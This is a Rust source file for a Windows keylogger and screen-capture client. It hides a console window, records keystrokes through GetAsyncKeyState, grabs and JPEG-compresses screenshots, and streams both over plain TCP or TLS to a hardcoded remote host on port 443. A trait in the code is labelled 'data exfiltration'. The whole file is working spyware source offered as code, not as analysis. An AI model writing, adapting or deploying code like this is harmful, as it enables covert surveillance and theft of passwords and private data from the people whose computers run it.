extern crate repng;
extern crate scrap;
extern crate winapi;
extern crate user32;
extern crate kernel32;
use scrap::{Capturer, Display};
use std::io::{Read, Write};
use std::io::ErrorKind::WouldBlock;
use std::convert::TryInto;
use std::thread;
use std::sync::mpsc::channel;
use std::time::Duration;
use std::net::{SocketAddr, TcpStream};
use mozjpeg::{ColorSpace, Compress};
use openssl::ssl::{SslMethod, SslConnector, SslStream};
use crate::pool::Pool;
// remember $Env:OPENSSL_DIR='C:\Program Files\OpenSSL-Win64'!!!
// and you need OpenSSL libraries installed as well to build for Win64

const REMOTE_DOMAIN: &str = "10.0.0.9";
const SIGNAL_SIZE: usize = 4;
const SYN_SIZE: usize = 8;
const REMOTE_PORT: i32 = 443;
enum TcpData {Keys(Vec<u8>), Screenshot(Vec<u8>)}

#[derive(Copy, Clone)]
#[allow(unused_variables)]
pub enum TcpSignalClient {
    ClientSyn = 1,
    ClientAck,
    ClientErr,
    ClientStop,
    StartSendKeys,
    StartSendScreen,
    StartSendMeta,
}

pub struct TCPSocketClient { 
    sock: TcpStream,
    pub frame_time: u128,
    compression_quality: f32
}

// TCP SYN: | signal (4) | data (4) |
// there is potential for some issues if the client tries to send a file
// that is greater than 2.1GB large but it should be fine for this ;)
fn build_data(buf: Vec<u8>) -> (i32, i32) {
    let (a, b) = buf.split_at(4);
    let left: [u8; 4] = a.try_into().unwrap();
    let right: [u8; 4] = b.try_into().unwrap();
    (i32::from_be_bytes(left), i32::from_be_bytes(right))
}

// trait for data exfiltration (tcp / tls)
pub trait Exfil {
    fn send(&mut self, signal: TcpSignalClient, data: Option<Vec<u8>>) {
        match signal {
            TcpSignalClient::StartSendKeys => {
                println!("Sending keys <3");
                self.send_on_ack(&signal, 5, data.unwrap_or(Vec::new()));
            },
            TcpSignalClient::StartSendScreen => {
                println!("Sending screenshot <3");
                self.send_on_ack(&signal, 6, data.unwrap_or(Vec::new()));
            },
            _ => {}
        };
    }
    fn send_on_ack(
        &mut self,
        signal: &TcpSignalClient,
        ack: i32,
        data: Vec<u8>) -> Result<(), i32>;
    fn frame_time(&self) -> u128;
    fn comp_quality(&self) -> f32;
}

// unencrypted TCP streaming
impl TCPSocketClient {
    pub fn init() -> TCPSocketClient {
        let mut nossl_stream = TcpStream::connect(
            format!("{}:{}", REMOTE_DOMAIN, REMOTE_PORT)
        ).unwrap();
        let mut buf = vec![0u8; SYN_SIZE];
        nossl_stream.write(&1i32.to_be_bytes()).unwrap();
        nossl_stream.read(&mut buf).unwrap();
        let (frame_time_ms, compression_quality) = build_data(buf);
        match frame_time_ms != 0 && compression_quality != 0 {
            true => {
                nossl_stream.write(&2i32.to_be_bytes()).unwrap();
                return TCPSocketClient{
                    sock: nossl_stream,
                    frame_time: frame_time_ms as u128,
                    compression_quality: compression_quality as f32
                }
            },
            false => {
                nossl_stream.write(&3i32.to_be_bytes()).unwrap();
                panic!("Unable to initialize!");
            }
        }
    }
}

impl Exfil for TCPSocketClient {
    fn send_on_ack(
        &mut self,
        signal: &TcpSignalClient,
        ack: i32,
        data: Vec<u8>
    ) -> Result<(), i32>
    {
        let mut res = [0u8; SIGNAL_SIZE];
        let mut out = vec![];
        let sig_int = *signal as u8;
        let sig_out = *&sig_int as i32;
        let size    = data.len() as i32;
        out.extend(&sig_out.to_be_bytes());
        out.extend(&size.to_be_bytes());
        println!("{:?}", out);
        self.sock
            .write(&out)
            .unwrap();
        self.sock
            .read(&mut res)
            .unwrap();
        if i32::from_be_bytes(res) == ack {
            self.sock.write(&data).unwrap();
            let mut reply = [0u8; SIGNAL_SIZE];
            self.sock.read(&mut reply);
            if i32::from_be_bytes(reply) != 1 { 
                // if the server sends anything else then we're no longer synchronized
                // so we're going to stop and we can restart later
                self.sock.write(&4i32.to_be_bytes()); 
                return Err(i32::from_be_bytes(reply))
            }
        } Ok(())
    }
    fn frame_time(&self) -> u128 { self.frame_time }
    fn comp_quality(&self) -> f32 { self.compression_quality }
}

pub struct TLSSocketClient { 
    sock: SslStream<TcpStream>,
    pub frame_time: u128,
    compression_quality: f32
}

// encrypted TLS/TCP streaming
impl TLSSocketClient {
    pub fn init() -> TLSSocketClient {
        let connector = SslConnector::builder(SslMethod::tls()).unwrap().build();
        let ssl_stream = TcpStream::connect(
            format!("{}:{}", REMOTE_DOMAIN, REMOTE_PORT)
        ).unwrap();
        let mut ssl_stream = connector.connect(REMOTE_DOMAIN, ssl_stream).unwrap();
        let mut buf = vec![0u8; SYN_SIZE];
        ssl_stream.write(&1i32.to_be_bytes()).unwrap();
        ssl_stream.read(&mut buf).unwrap();
        let (frame_time_ms, compression_quality) = build_data(buf);
        match frame_time_ms != 0 && compression_quality != 0 {
            true => {
                ssl_stream.write(&2i32.to_be_bytes()).unwrap();
                return TLSSocketClient{
                    sock: ssl_stream,
                    frame_time: frame_time_ms as u128,
                    compression_quality: compression_quality as f32
                }
            },
            false => {
                ssl_stream.write(&3i32.to_be_bytes()).unwrap();
                panic!("Unable to initialize!");
            }
        }
    }

}

impl Exfil for TLSSocketClient {
    fn send_on_ack(
        &mut self,
        signal: &TcpSignalClient,
        ack: i32,
        data: Vec<u8>
    ) -> Result<(), i32>
    {
        let mut res = [0u8; SIGNAL_SIZE];
        let sig_int = *signal as u8;
        self.sock
            .ssl_write(&sig_int.to_be_bytes())
            .unwrap();
        self.sock
            .ssl_read(&mut res)
            .unwrap();
        if i32::from_be_bytes(res) == ack {
            self.sock
                .ssl_write(&data)
                .unwrap(); 
        } Ok(())
    }
    fn frame_time(&self) -> u128 { self.frame_time }
    fn comp_quality(&self) -> f32 { self.compression_quality }
}

fn gather_keystrokes(keystrokes: &mut Vec<u8>) {
    // spawns a new windows (((console))) with IO inputs
    let window_sink: winapi::HWND;
    unsafe {
        kernel32::AllocConsole();
        window_sink = user32::FindWindowA(
            std::ffi::CString::new("ConsoleWindowClass")
                .unwrap()
                .as_ptr(),
            std::ptr::null()
        );
        user32::ShowWindow(window_sink,0);
    };
    for i in 8..190 {
        if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
            // read the inputs into the (((console)))
            let key: String = match i as i32 {
                32 => " ".into(),
                8 => "[Backspace]".into(),
                13 => "\n".into(),
                winapi::VK_TAB => "[TAB]".into(),
                winapi::VK_SHIFT => "[SHIFT]".into(),
                winapi::VK_CONTROL => "[CTRL]".into(),
                winapi::VK_ESCAPE => "[ESCAPE]".into(),
                winapi::VK_END => "[END]".into(),
                winapi::VK_HOME => "[HOME]".into(),
                winapi::VK_LEFT => "[LEFT]".into(),
                winapi::VK_UP => "[UP]".into(),
                winapi::VK_RIGHT => "[RIGHT]".into(),
                winapi::VK_DOWN => "[DOWN]".into(),
                190|110 => ".".into(),
                _ => (i as u8 as char).to_string()
            };
            for word in key.as_bytes() { keystrokes.push(*word) }
        }
    };
}

pub fn grab_multiple<T>(pool: &mut Pool, socket: &mut T)
where T: Exfil
{
    let one_frame = Duration::new(1, 0) / 60;
    let display = Display::primary().expect("Couldn't find primary display.");
    let mut capturer = Capturer::new(display).expect("Couldn't begin capture.");
    let (w, h) = (capturer.width(), capturer.height());
    let comp_quality = socket.comp_quality();
    let time = socket.frame_time();
    loop {
        let (key_sender, receiver) = channel();
        let scr_sender = key_sender.clone();
        let master_now = std::time::SystemTime::now();
        let thread_now = master_now.clone();
        pool.execute(move || {
            let mut keystrokes = Vec::new();
            loop {
                match thread_now.elapsed().unwrap().as_millis() >= time {
                    true => {
                        match key_sender.send(TcpData::Keys(keystrokes)) {
                            Ok(_) => break,
                            Err(_) => break // main thread stopped listening
                        }
                    },
                    false => gather_keystrokes(&mut keystrokes)
                }
            }
        });
        let frame = {
            loop {
                match capturer.frame() {
                    Ok(buffer) => break buffer.to_vec(),
                    Err(error) => {
                        if error.kind() == WouldBlock {
                            thread::sleep(one_frame);
                            continue;
                        } else {
                            panic!("Error: {}", error);
                        }
                    }   
                }
            }
        };
        pool.execute(move || {
            match encode(frame, w, h, comp_quality) {
                Some(scr) => scr_sender.send(TcpData::Screenshot(scr)).unwrap(),
                None => {}
            }
        });
        loop {
            match master_now
                .elapsed()
                .unwrap()
                .as_millis() >= socket.frame_time() 
            {
                true => {
                    for _ in 0..2 {
                        // 1 thread for keylogging 1 thread for screenshot compression
                        match receiver.recv() {
                            Ok(data) => match data{
                                TcpData::Keys(keys) => {
                                    if keys.len() != 0 {
                                        socket.send(
                                            TcpSignalClient::StartSendKeys,
                                            Some(keys)
                                        )
                                    }
                                },
                                TcpData::Screenshot(scr) => {
                                    socket.send(
                                        TcpSignalClient::StartSendScreen,
                                        Some(scr)
                                    )
                                },
                            },
                            Err(_) => {}
                        }
                    } break;
                },
                false => { }
            }
        }
    }
}

fn encode(frame: Vec<u8>, w: usize, h: usize, comp: f32) -> Option<Vec<u8>> {
    let mut jpeg = Compress::new(ColorSpace::JCS_EXT_BGRA);
    jpeg.set_size(w, h);
    jpeg.set_quality(comp);
    jpeg.set_mem_dest();
    jpeg.start_compress();
    match jpeg.write_scanlines(&frame) {
        true => {},
        false => return None
    }
    jpeg.finish_compress();
    Some(jpeg.data_to_vec().unwrap())
}
